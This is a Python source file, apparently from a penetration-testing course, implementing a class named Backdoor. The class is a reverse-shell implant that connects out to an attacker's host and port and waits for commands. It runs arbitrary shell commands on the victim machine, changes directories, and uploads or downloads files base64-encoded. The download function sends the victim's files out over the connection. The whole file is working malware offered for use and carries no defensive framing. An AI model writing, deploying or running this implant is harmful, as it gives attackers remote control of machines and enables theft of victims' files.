#!/usr/bin/env python
import socket
import subprocess
import json, os, base64
# we're using base64 encoding method so that we can decode it using a known method
# as we are reading the file in the binary so we need to convert that file using base64 algorithm

class Backdoor:
	def __init__(self,ip,port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def reliable_send(self, data):

		self.json_data = json.dumps(data)
		self.connection.sendall(self.json_data.encode('utf-8'))

	def reliable_recieve(self):
		json_data = ""
		
		while True:
			try:
				json_data = json_data + (self.connection.recv(1024)).decode('utf-8')
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self,command):
		self.reliable_send(command)
		return self.reliable_recieve()

	def execute_system_command(self,command):

		return subprocess.check_output(command, shell=True)

	def chdir(self, path):
		os.chdir(path)
		msg = "[+] Changing current directory to " + path
		return msg.encode('utf-8')

	def read_file(self, path):  # for downloading purpose
		with open (path,"rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path,content):  # for uploading purpose
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful. "

	def run(self):

		while True:
			command = self.reliable_recieve()

			try:
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					cmd_result = self.chdir(command[1])
					
				elif command[0] == "download":
					cmd_result = self.read_file(command[1])

				elif command[0] == "upload":
					cmd_result = self.write_file(command[1],command[2])  # ["file_name","file_content"]
					
				else:
					cmd_result = self.execute_system_command(command)
			except Exception:
				cmd_result = "[-] Error During command execution"
			
			if isinstance(cmd_result,str):
				self.reliable_send(cmd_result)
			else:
				self.reliable_send(cmd_result.decode('utf-8'))

				

rev = Backdoor("LHOST",LPORT)
rev.run()